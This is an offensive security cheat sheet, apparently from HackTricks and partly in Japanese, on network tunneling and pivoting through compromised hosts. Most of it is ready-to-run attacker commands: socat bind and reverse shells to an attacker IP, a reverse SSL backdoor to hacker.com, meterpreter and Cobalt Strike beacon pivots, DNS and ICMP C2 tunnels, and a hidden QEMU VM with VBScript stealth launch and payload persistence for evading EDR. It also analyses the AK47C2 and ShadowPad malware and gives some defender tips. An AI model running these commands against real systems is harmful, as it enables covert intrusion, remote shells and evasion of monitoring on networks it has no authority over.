# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> **ICMP** and **SYN** scans cannot be tunnelled through socks proxies, so we must **disable ping discovery** (`-Pn`) and specify **TCP scans** (`-sT`) for this to work.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH グラフィカル接続 (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH Serverで新しいPortを開く --> Other port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

ローカルポート --> 侵害されたホスト (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

ローカルポート --> Compromised host (SSH) --> 任意の場所
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

これは、DMZを経由して内部ホストから自分のホストへreverse shellを取得するのに便利です：
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

**両方のデバイスで root 権限が必要**です（新しい interface を作成するため）。また、sshd config で root login が許可されている必要があります:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
サーバー側でフォワーディングを有効化する
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
クライアント側で新しいルートを設定する
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> 2023年のTerrapin downgrade attackでは、man-in-the-middleがSSH handshakeの初期段階を改ざんし、**any forwarded channel**（ `-L`、`-R`、`-D` ）にdataをinjectできる可能性があります。SSH tunnelsを利用する前に、clientとserverの両方にpatch（**OpenSSH ≥ 9.6/LibreSSH 6.7**）を適用するか、`sshd_config`/`ssh_config`で脆弱な`chacha20-poly1305@openssh.com`および`*-etm@openssh.com` algorithmsを明示的にdisableしてください。

## SSHUTTLE

host経由でsubnetworkへの**すべてのtraffic**を**ssh**で**tunnel**できます。\
たとえば、10.10.10.0/24宛てのすべてのtrafficをforwardする場合
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
秘密鍵で接続する
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

ローカルポート --> 侵害済みホスト（active session） --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
別の方法：
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

teamserverで全インターフェース上にlistenするportを開き、**beacon経由でtrafficをrouteする**ために使用できます。
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> この場合、**port は Team Server ではなく beacon host で開かれ**、traffic は Team Server に送信され、そこから指定された host:port に送られます。
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
注意:

- Beacon の reverse port forward は、**個々のマシン間でリレーするためではなく、Team Server へ traffic をトンネルするよう設計されています**。
- Traffic は、P2P links を含む **Beacon の C2 traffic 内でトンネルされます**。
- **high ports で reverse port forwards を作成するために Admin privileges は必要ありません**。

### rPort2Port local

> [!WARNING]
> この場合、**port は Team Server ではなく beacon host で開かれ**、**traffic は Team Server ではなく Cobalt Strike client に送信され**、そこから指定された host:port に送信されます。
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

web file tunnel を upload する必要があります: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) の releases page から download できます\
**client と server には同じ version を使用する必要があります**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**agent と proxy には同じ version を使用**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent のバインドとリスニング
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Agent のローカルポートへのアクセス
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel。トンネルは被害者側から開始されます。\
127.0.0.1:1080 に socks4 proxy が作成されます。
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy** を介した Pivot
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### リバースシェル
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### socks経由のPort2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat 経由の Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
**認証不要のプロキシ**を回避するには、被害者のコンソールで最後の行の代わりに次の行を実行します:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

ClientとServerの両側で証明書を作成する
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

ローカルのSSHポート（22）を攻撃者ホストの443ポートに接続する
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

コンソール版の PuTTY のようなもので、オプションは ssh client と非常によく似ています。

この binary は victim 上で実行され、ssh client であるため、reverse connection を確立できるように、こちら側で ssh service と port を開く必要があります。次に、locally accessible port からこちらの machine の port へ forward するには:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

You need to be a local admin (for any port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

**システムへの RDP access**が必要です。\
Download:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - この tool は Windows の Remote Desktop Service feature に含まれる `Dynamic Virtual Channels` (`DVC`) を使用します。DVC は **RDP connection 経由で packets を tunneling する役割**を担います。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

client computer で **`SocksOverRDP-Plugin.dll`** を次のように load します。
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
これで **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **connect** でき、**SocksOverRDP plugin** が有効になっており、**127.0.0.1:1080** で **listen** することを示す **prompt** が表示されます。

**RDP** 経由で **connect** し、victim machine に `SocksOverRDP-Server.exe` binary を upload して execute します：
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
ここで、あなたのマシン（attacker）でポート1080がlistenしていることを確認します：
```
netstat -antb | findstr 1080
```
これで [**Proxifier**](https://www.proxifier.com/) **を使用して、そのポート経由でトラフィックをプロキシできます。**

## Windows GUI Apps を Proxify

[**Proxifier**](https://www.proxifier.com/) を使用して、Windows GUI apps をプロキシ経由で通信させることができます。\
**Profile -> Proxy Servers** で、SOCKS server の IP と port を追加します。\
**Profile -> Proxification Rules** で、proxify するプログラムの名前と、proxify する対象の IP への接続を追加します。

## NTLM proxy bypass

前述の tool: **Rpivot**\
**OpenVPN** でも、configuration file に以下の options を設定することで bypass できます:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

proxy に対して認証を行い、指定した外部 service に forward される port をローカルで bind します。その後、この port 経由で任意の tool を使用できます。\
たとえば、port 443 を forward します
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
ここで、例えば victim の **SSH** service が port 443 で listen するように設定したとします。attacker の port 2222 経由で接続できます。\
**meterpreter** を使用して localhost:443 に接続し、attacker が port 2222 で listen するようにすることもできます。

## YARP

Microsoft が作成した reverse proxy です。こちらで確認できます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

両方の system で、tun adapter を作成し、DNS query を使用してそれらの間で data を tunnel するために root が必要です。
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
このトンネルは非常に遅くなります。このトンネルを介して圧縮された SSH 接続を作成するには、次を使用します。
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

DNSを介してC\&Cチャネルを確立します。root権限は必要ありません。
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShellでは**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) を使用して、PowerShellで dnscat2 client を実行できます：
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscatによるポートフォワーディング**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains DNS の変更

Proxychains は `gethostbyname` libc call をインターセプトし、socks proxy 経由で tcp DNS request をトンネルします。**デフォルトでは**、proxychains が使用する **DNS** server は **4.2.2.2**（ハードコード）です。変更するには、ファイル _/usr/lib/proxychains3/proxyresolv_ を編集して IP を変更します。**Windows environment** にいる場合は、**domain controller** の IP を設定できます。

## Go の Tunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor は、*outbound* **DNS** と **plain HTTP POST** traffic のみを悪用する **dual-channel C2 ("AK47C2")** を作成しました。これは corporate networks でブロックされることがほとんどない 2 つの protocols です。<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• ランダムな 5 文字の SessionID（例: `H4T14`）を生成します。
• *task requests* には `1`、*results* には `2` を先頭に付け、異なる fields（flags、SessionID、computer name）を連結します。
• 各 field は ASCII key `VHBD@H` で **XOR-encrypted** され、hex-encoded された後、dots で結合されます。最後に attacker-controlled domain が付きます。

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests は `DnsQuery()` を使用して **TXT**（および fallback **MG**）records を取得します。
• Response が 0xFF bytes を超える場合、backdoor は data を 63-byte pieces に **fragments** し、markers:
`s<SessionID>t<TOTAL>p<POS>` を挿入して、C2 server が並べ替えられるようにします。

2. **HTTP mode (AK47HTTP)**
• JSON envelope を構築します:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Blob 全体を XOR-`VHBD@H` → hex → `Content-Type: text/plain` header 付きの **`POST /`** の body として送信します。
• Reply も同じ encoding に従い、`cmd` field は `cmd.exe /c <command> 2>&1` で実行されます。

Blue Team notes
• first label が長い hexadecimal で、常に 1 つの rare domain で終わる、異常な **TXT queries** を探します。
• Constant XOR key の後に ASCII-hex が続く形式は、YARA で簡単に検出できます: `6?56484244?484`（`VHBD@H` の hex）。
• HTTP では、pure hex で 2 bytes の倍数になっている `text/plain` POST bodies にフラグを立てます。

{{#note}}
この channel 全体は **standard RFC-compliant queries** 内に収まり、各 sub-domain label を 63 bytes 未満に維持するため、ほとんどの DNS logs で stealthy です。
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

両方の systems で tun adapters を作成し、ICMP echo requests を使用して data をトンネルするには Root が必要です。
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**こちらからダウンロード**](https://github.com/utoni/ptunnel-ng.git)。
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **は、1つのコマンドラインでソリューションをInternetに公開するためのtoolです。**\
_公開用URIは次のようになります:_ **UID.ngrok.io**

### Installation

- アカウントを作成: https://ngrok.com/signup
- Clientをダウンロード:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本的な使用方法

**ドキュメント:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_必要に応じて、認証とTLSを追加することも可能です。_

#### TCPのトンネリング
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTPでファイルを公開する
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP calls の Sniffing

_XSS、SSRF、SSTI などに有用_\
stdout または HTTP interface [http://127.0.0.1:4040](http://127.0.0.1:4000) から直接確認できます。

#### internal HTTP service の Tunneling
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml のシンプルな設定例

3つのトンネルを開きます：

- TCP 2つ
- /tmp/httpbin/ から静的ファイルを公開する HTTP 1つ
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare の `cloudflared` daemon は、Cloudflare の edge を rendez-vous point として使用し、inbound firewall rules を必要とせずに **local TCP/UDP services** を公開する outbound tunnels を作成できます。これは、egress firewall が HTTPS traffic のみを許可し、inbound connections がブロックされている場合に非常に便利です。

### Quick tunnel のワンライナー
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNSを使用した永続的なトンネル
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
コネクタを起動します：
```bash
cloudflared tunnel run mytunnel
```
すべての traffic が **outbound over 443** で host から出ていくため、Cloudflared tunnels は ingress ACL や NAT boundaries を bypass する簡単な方法です。binary は通常、elevated privileges で実行される点に注意してください。可能な場合は containers または `--user` flag を使用します。

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) は、**TCP、UDP、HTTP/S、SOCKS、P2P NAT-hole-punching** をサポートする、active に保守されている Go reverse-proxy です。**v0.53.0（2024 年 5 月）** 以降は **SSH Tunnel Gateway** として動作できるため、target host は追加の binary なしで、stock OpenSSH client だけを使用して reverse tunnel を起動できます。

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 新しい SSH gateway の使用（frpc binary なし）
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
上記のコマンドは、追加の tooling をデプロイすることなく、victim の **8080** ポートを **attacker_ip:9000** として公開します。living-off-the-land による pivoting に最適です。

## QEMU を使用した Covert VM-based Tunnels

QEMU の user-mode networking（`-netdev user`）は、**host 上の TCP/UDP ポートを bind し、*guest* 内へ forward する** `hostfwd` というオプションをサポートしています。guest で完全な SSH daemon を実行すると、hostfwd ルールにより、一時的な VM 内だけで動作する使い捨ての SSH jump box を利用できます。これは、すべての malicious activity とファイルが virtual disk 内に留まるため、EDR から C2 traffic を隠すのに最適です。<sup>[[1]](#references)</sup>

### 簡単な one-liner
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 上記のコマンドは **Tiny Core Linux** イメージ（`tc.qcow2`）を RAM 上で起動します。
• Windows ホストのポート **2222/tcp** は、ゲスト内部の **22/tcp** に透過的に転送されます。
• attacker の視点では、target は単にポート 2222 を公開しているだけです。そこに到達したすべてのパケットは、VM 内で実行されている SSH server によって処理されます。

### VBScript を介したステルス起動
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs` でスクリプトを実行すると、ウィンドウは非表示のままになります。

### ゲスト内での永続化

Tiny Core は stateless であるため、攻撃者は通常、次の手順を実行します。

1. payload を `/opt/123.out` に配置する
2. `/opt/bootlocal.sh` に追記する：

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `home/tc` と `opt` を `/opt/filetool.lst` に追加し、シャットダウン時に payload が `mydata.tgz` にパックされるようにする。

### これが検知を回避する理由

• 署名のない実行ファイル（`qemu-system-*.exe`）2つだけがディスクにアクセスし、driver や service はインストールされない。
• ホスト上の Security product からは、**benign な loopback traffic** に見える（実際の C2 は VM 内で terminate する）。
• Memory scanner は、malicious process space が別の OS 内に存在するため、これを解析できない。

### Defender 向けのヒント

• user-writable path にある **想定外の QEMU/VirtualBox/KVM binary** を Alert する。
• `qemu-system*.exe` を送信元とする outbound connection を Block する。
• QEMU の launch 直後に bind する、稀な listening port（2222、10022、…）を Hunt する。

## `HttpAddUrl` を介した IIS/HTTP.sys relay node（ShadowPad）

Ink Dragon の ShadowPad IIS module は、covert URL prefix を HTTP.sys layer に直接 bind することで、侵害された perimeter web server をすべて **backdoor + relay** の dual-purpose node に変える：<sup>[[3]](#references)</sup>

* **Config defaults** – module の JSON config で値が省略された場合、実在性のある IIS defaults（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）に fallback する。これにより、benign traffic には IIS が正しい branding で応答する。
* **Wildcard interception** – operator は URL prefix の semicolon-separated list（host + path に wildcard を使用）を指定する。module は各 entry に対して `HttpAddUrl` を call するため、HTTP.sys は matching request を、request が IIS module に到達する *前に* malicious handler へ route する。
* **Encrypted first packet** – request body の最初の2 byte には custom 32-bit PRNG の seed が含まれる。以降の各 byte は、protocol parsing の前に生成された keystream と XOR される：

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module は2つの list を管理する：“servers”（upstream node）と “clients”（downstream implant）。約30秒以内に heartbeat が到着しない entry は prune される。両方の list が空でない場合、最初の healthy server と最初の healthy client を pair にし、片側が close するまで両 socket 間で byte をそのまま pipe する。
* **Debug telemetry** – optional logging は、各 pairing について source IP、destination IP、forward された byte の合計を記録する。investigator はこれらの breadcrumb を使用して、複数の victim にまたがる ShadowPad mesh を再構築した。

---

## その他に確認すべき tools

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
